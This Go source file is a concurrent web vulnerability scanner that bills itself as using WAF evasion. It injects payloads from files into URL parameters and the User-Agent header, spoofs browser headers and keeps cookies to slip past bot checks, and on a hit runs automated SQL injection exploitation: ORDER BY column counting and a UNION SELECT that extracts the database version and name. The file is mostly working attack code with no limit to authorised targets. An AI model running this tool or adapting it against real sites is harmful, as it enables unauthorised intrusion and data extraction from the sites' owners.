package main

import (
        "bufio"
        "flag"
        "fmt"
        "io"
        "net/http"
        "net/http/cookiejar"
        "net/url"
        "os"
        "strconv"
        "strings"
        "sync"
        "time"

        "github.com/fatih/color"
)

// Define colors for output
var (
        red    = color.New(color.FgRed).SprintFunc()
        green  = color.New(color.FgGreen).SprintFunc()
        yellow = color.New(color.FgYellow).SprintFunc()
        cyan   = color.New(color.FgCyan).SprintFunc()
        blue   = color.New(color.FgBlue).SprintFunc()
        white  = color.New(color.FgWhite).SprintFunc()
)

// --- Constants & Global Flags ---
var sqlErrorPatterns = []string{"sql syntax", "mysql", "unclosed quotation mark", "odbc", "oracle", "you have an error in your sql syntax"}
var lfiContentPatterns = []string{"root:x:0:0", "boot.ini"}
const standardUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

// Pointers for our flags
var (
        injectPoint *string
        verbose     *bool
        dump        *bool
)

// **NEW**: A shared, more sophisticated HTTP client to handle cookies and simulate a real browser.
var httpClient *http.Client

func init() {
        // Initialize a cookie jar to store and send cookies automatically.
        // This is crucial for bypassing many WAF/anti-bot challenges.
        jar, err := cookiejar.New(nil)
        if err != nil {
                // This is a fatal error for the application's logic.
                panic(fmt.Sprintf("Failed to create cookie jar: %v", err))
        }

        httpClient = &http.Client{
                Jar:     jar,
                Timeout: 20 * time.Second,
        }
}

func main() {
        // --- Flag Definitions ---
        urlFile := flag.String("urls", "urls.txt", "File containing a list of URLs to scan")
        sqliFile := flag.String("sqli", "", "File containing SQLi payloads")
        lfiFile := flag.String("lfi", "", "File containing LFI payloads")
        osFile := flag.String("os", "", "File containing OS injection payloads")
        concurrency := flag.Int("c", 10, "Number of concurrent goroutines")
        injectPoint = flag.String("inject-point", "all", "Injection point to test: all, header, or param")
        verbose = flag.Bool("v", false, "Enable verbose output to see every request")
        dump = flag.Bool("dump", false, "Dump response body and attempt advanced SQLi dump on discovery")

        flag.Parse()

        // --- Welcome Banner ---
        fmt.Println(cyan("============================================="))
        fmt.Println(cyan("=    Go Vulnerability Scanner (v9.0)      ="))
        fmt.Println(cyan("=          WAF Evasion Techniques         ="))
        fmt.Println(cyan("============================================="))

        // --- Input Validation ---
        if *sqliFile == "" && *lfiFile == "" && *osFile == "" {
                fmt.Println(red("Error: You must specify at least one payload type (--sqli, --lfi, or --os)"))
                os.Exit(1)
        }

        urls, err := readLines(*urlFile)
        if err != nil {
                fmt.Printf(red("Error reading URL file %s: %v\n"), *urlFile, err)
                os.Exit(1)
        }

        // --- Concurrency Setup ---
        tasks := make(chan string)
        var wg sync.WaitGroup

        for i := 0; i < *concurrency; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        for url := range tasks {
                                if *sqliFile != "" {
                                        scan(url, *sqliFile, "SQLi")
                                }
                                if *lfiFile != "" {
                                        scan(url, *lfiFile, "LFI")
                                }
                                if *osFile != "" {
                                        scan(url, *osFile, "OS-INJ")
                                }
                        }
                }()
        }

        // --- Task Distribution ---
        fmt.Println(cyan("[INFO] Distributing " + strconv.Itoa(len(urls)) + " URL(s) to workers..."))
        for _, url := range urls {
                tasks <- url
        }
        close(tasks)

        wg.Wait()
        fmt.Println(yellow("\nScan finished."))
}

func scan(baseURL, payloadFile, vulnType string) {
        payloads, err := readLines(payloadFile)
        if err != nil {
                fmt.Printf(red("[%s] Error reading payload file %s: %v\n"), baseURL, payloadFile, err)
                return
        }

        if !*verbose {
                fmt.Printf(cyan("[INFO] Starting %s scan on %s (Points: %s)\n"), vulnType, baseURL, *injectPoint)
        }

        for _, payload := range payloads {
                switch *injectPoint {
                case "header":
                        checkUserAgent(baseURL, payload, vulnType, *dump)
                case "param":
                        checkURLParameters(baseURL, payload, vulnType, *dump)
                default:
                        checkUserAgent(baseURL, payload, vulnType, *dump)
                        checkURLParameters(baseURL, payload, vulnType, *dump)
                }
        }
}

// **MODIFIED**: Now uses the global, more advanced httpClient.
func performCheck(targetURL, payload, vulnType, injectionPoint string, dumpData bool, headers ...string) {
        if *verbose {
                fmt.Printf(white("[TESTING] Point: %-12s | Payload: %s\n"), yellow(injectionPoint), payload)
        }

        req, err := http.NewRequest("GET", targetURL, nil)
        if err != nil {
                return
        }

        // Set more realistic browser headers to avoid simple bot detection.
        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req.Header.Set("Accept-Language", "en-US,en;q=0.5")
        req.Header.Set("Connection", "keep-alive")

        if len(headers) > 0 {
                req.Header.Set("User-Agent", headers[0])
        } else {
                req.Header.Set("User-Agent", standardUA)
        }

        startTime := time.Now()
        // Use the global httpClient which has the cookie jar.
        resp, err := httpClient.Do(req)
        if err != nil {
                return
        }
        defer resp.Body.Close()
        duration := time.Since(startTime)

        bodyBytes, _ := io.ReadAll(resp.Body)
        bodyString := string(bodyBytes)

        isVulnerable := false
        detectionDetails := ""

        switch vulnType {
        case "SQLi":
                for _, pattern := range sqlErrorPatterns {
                        if strings.Contains(strings.ToLower(bodyString), pattern) {
                                isVulnerable = true
                                detectionDetails = fmt.Sprintf("Found error pattern: '%s'", pattern)
                                break
                        }
                }
                if !isVulnerable && duration.Seconds() > 9.5 {
                        isVulnerable = true
                        detectionDetails = fmt.Sprintf("Response time delay: %.2fs", duration.Seconds())
                }
        case "LFI":
                for _, pattern := range lfiContentPatterns {
                        if strings.Contains(bodyString, pattern) {
                                isVulnerable = true
                                detectionDetails = fmt.Sprintf("Found content: '%s'", pattern)
                                break
                        }
                }
        case "OS-INJ":
                if duration.Seconds() > 9.5 {
                        isVulnerable = true
                        detectionDetails = fmt.Sprintf("Response time delay: %.2fs", duration.Seconds())
                }
        }

        if isVulnerable {
                fmt.Printf("\n[%s] %s FOUND!\n", green("VULNERABLE"), yellow(vulnType))
                fmt.Printf("  URL:     %s\n", blue(targetURL))
                fmt.Printf("  Point:   %s\n", yellow(injectionPoint))
                fmt.Printf("  Payload: %s\n", red(payload))
                fmt.Printf("  Details: %s\n", detectionDetails)

                if dumpData {
                        fmt.Printf("  [%s] Dumping initial response body:\n", cyan("DUMP"))
                        fmt.Println(white("----------------------- RESPONSE START -----------------------"))
                        fmt.Println(white(bodyString))
                        fmt.Println(white("------------------------ RESPONSE END ------------------------"))

                        if vulnType == "SQLi" {
                                if strings.HasPrefix(injectionPoint, "Param:") {
                                        dumpDatabaseInfoFromParam(targetURL, payload, injectionPoint)
                                } else if injectionPoint == "User-Agent" {
                                        dumpDatabaseInfoFromHeader(targetURL)
                                }
                        }
                }
                fmt.Println()
        }
}

// **MODIFIED**: Now uses the global httpClient for all requests.
func dumpDatabaseInfoFromParam(vulnerableURL, originalPayload, injectionPoint string) {
        fmt.Printf("  [%s] Starting advanced SQLi dump for parameter injection...\n", cyan("DUMP+"))

        parsedURL, err := url.Parse(vulnerableURL)
        if err != nil {
                fmt.Printf("  [%s] Could not parse URL for advanced dump.\n", red("ERROR"))
                return
        }
        paramName := strings.TrimSpace(strings.TrimPrefix(injectionPoint, "Param:"))
        baseURL := parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.Path

        fmt.Printf("  [%s] Attempting to find column count with ORDER BY...\n", cyan("DUMP+"))
        columnCount := 0
        for i := 1; i <= 25; i++ {
                testPayload := url.QueryEscape("'" + " ORDER BY " + strconv.Itoa(i) + "-- -")
                queryParams := parsedURL.Query()
                queryParams.Set(paramName, testPayload)
                testURL := baseURL + "?" + queryParams.Encode()

                req, err := http.NewRequest("GET", testURL, nil)
                if err != nil {
                        continue
                }
                req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

                resp, err := httpClient.Do(req)
                if err != nil {
                        continue
                }
                bodyBytes, _ := io.ReadAll(resp.Body)
                bodyString := string(bodyBytes)
                resp.Body.Close()

                hasError := false
                for _, pattern := range sqlErrorPatterns {
                        if strings.Contains(strings.ToLower(bodyString), pattern) {
                                hasError = true
                                break
                        }
                }

                if hasError {
                        columnCount = i - 1
                        break
                }
        }

        if columnCount == 0 {
                fmt.Printf("  [%s] Could not determine column count automatically.\n", red("FAIL"))
                return
        }
        fmt.Printf("  [%s] Determined column count: %d\n", green("SUCCESS"), columnCount)

        fmt.Printf("  [%s] Attempting to extract DB info with UNION SELECT...\n", cyan("DUMP+"))
        nulls := make([]string, columnCount)
        for i := 0; i < columnCount; i++ {
                nulls[i] = "NULL"
        }

        infoPayloadParts := make([]string, columnCount)
        copy(infoPayloadParts, nulls)
        infoPayloadParts[0] = "CONCAT('v_e_r_s_i_o_n:',@@version,'d_a_t_a_b_a_s_e:',database())"
        unionPayload := url.QueryEscape("'" + " UNION SELECT " + strings.Join(infoPayloadParts, ",") + "-- -")

        queryParams := parsedURL.Query()
        queryParams.Set(paramName, unionPayload)
        finalURL := baseURL + "?" + queryParams.Encode()

        fmt.Printf("  [%s] Sending UNION payload: %s\n", cyan("DUMP+"), finalURL)

        req, err := http.NewRequest("GET", finalURL, nil)
        if err != nil {
                fmt.Printf("  [%s] Failed to create UNION SELECT request: %v\n", red("ERROR"), err)
                return
        }
        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

        resp, err := httpClient.Do(req)
        if err != nil {
                fmt.Printf("  [%s] Failed to send UNION SELECT payload: %v\n", red("ERROR"), err)
                return
        }
        defer resp.Body.Close()
        bodyBytes, _ := io.ReadAll(resp.Body)

        fmt.Printf("  [%s] UNION SELECT response body:\n", cyan("DUMP+"))
        fmt.Println(white("----------------------- UNION RESPONSE START -------------------"))
        fmt.Println(white(string(bodyBytes)))
        fmt.Println(white("------------------------ UNION RESPONSE END --------------------"))
        fmt.Println(yellow("  [TIP] Look for 'v_e_r_s_i_o_n:' and 'd_a_t_a_b_a_s_e:' in the output above."))
}

// **MODIFIED**: Now uses the global httpClient for all requests.
func dumpDatabaseInfoFromHeader(baseURL string) {
        fmt.Printf("  [%s] Starting advanced SQLi dump for User-Agent injection...\n", cyan("DUMP+"))

        fmt.Printf("  [%s] Attempting to find column count with ORDER BY...\n", cyan("DUMP+"))
        columnCount := 0
        for i := 1; i <= 25; i++ {
                testPayload := standardUA + "' ORDER BY " + strconv.Itoa(i) + "-- -"
                req, err := http.NewRequest("GET", baseURL, nil)
                if err != nil {
                        continue
                }
                req.Header.Set("User-Agent", testPayload)
                req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

                resp, err := httpClient.Do(req)
                if err != nil {
                        continue
                }
                bodyBytes, _ := io.ReadAll(resp.Body)
                bodyString := string(bodyBytes)
                resp.Body.Close()

                hasError := false
                for _, pattern := range sqlErrorPatterns {
                        if strings.Contains(strings.ToLower(bodyString), pattern) {
                                hasError = true
                                break
                        }
                }
                if hasError {
                        columnCount = i - 1
                        break
                }
        }

        if columnCount == 0 {
                fmt.Printf("  [%s] Could not determine column count automatically.\n", red("FAIL"))
                return
        }
        fmt.Printf("  [%s] Determined column count: %d\n", green("SUCCESS"), columnCount)

        fmt.Printf("  [%s] Attempting to extract DB info with UNION SELECT...\n", cyan("DUMP+"))
        nulls := make([]string, columnCount)
        for i := 0; i < columnCount; i++ {
                nulls[i] = "NULL"
        }

        infoPayloadParts := make([]string, columnCount)
        copy(infoPayloadParts, nulls)
        infoPayloadParts[0] = "CONCAT('v_e_r_s_i_o_n:',@@version,'d_a_t_a_b_a_s_e:',database())"
        unionPayloadString := "' UNION SELECT " + strings.Join(infoPayloadParts, ",") + "-- -"
        finalPayload := standardUA + unionPayloadString

        req, err := http.NewRequest("GET", baseURL, nil)
        if err != nil {
                fmt.Printf("  [%s] Failed to create UNION SELECT request: %v\n", red("ERROR"), err)
                return
        }
        req.Header.Set("User-Agent", finalPayload)
        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

        fmt.Printf("  [%s] Sending UNION payload in User-Agent...\n", cyan("DUMP+"))
        resp, err := httpClient.Do(req)
        if err != nil {
                fmt.Printf("  [%s] Failed to send UNION SELECT payload: %v\n", red("ERROR"), err)
                return
        }
        defer resp.Body.Close()
        bodyBytes, _ := io.ReadAll(resp.Body)

        fmt.Printf("  [%s] UNION SELECT response body:\n", cyan("DUMP+"))
        fmt.Println(white("----------------------- UNION RESPONSE START -------------------"))
        fmt.Println(white(string(bodyBytes)))
        fmt.Println(white("------------------------ UNION RESPONSE END --------------------"))
        fmt.Println(yellow("  [TIP] Look for 'v_e_r_s_i_o_n:' and 'd_a_t_a_b_a_s_e:' in the output above."))
}

func checkURLParameters(baseURL, payload, vulnType string, dumpData bool) {
        parsedURL, err := url.Parse(baseURL)
        if err != nil {
                return
        }
        params := parsedURL.Query()
        if len(params) == 0 {
                return
        }

        paramNames := make([]string, 0, len(params))
        for name := range params {
                paramNames = append(paramNames, name)
        }

        for _, paramName := range paramNames {
                originalValues := params[paramName]
                params.Set(paramName, payload)
                parsedURL.RawQuery = params.Encode()
                injectedURL := parsedURL.String()

                performCheck(injectedURL, payload, vulnType, fmt.Sprintf("Param: %s", paramName), dumpData)

                params[paramName] = originalValues
        }
}

func checkUserAgent(url, payload, vulnType string, dumpData bool) {
        injectedUA := standardUA + " " + payload
        performCheck(url, payload, vulnType, "User-Agent", dumpData, injectedUA)
}

func readLines(path string) ([]string, error) {
        file, err := os.Open(path)
        if err != nil {
                return nil, err
        }
        defer file.Close()

        var lines []string
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
                lines = append(lines, scanner.Text())
        }
        return lines, scanner.Err()
}
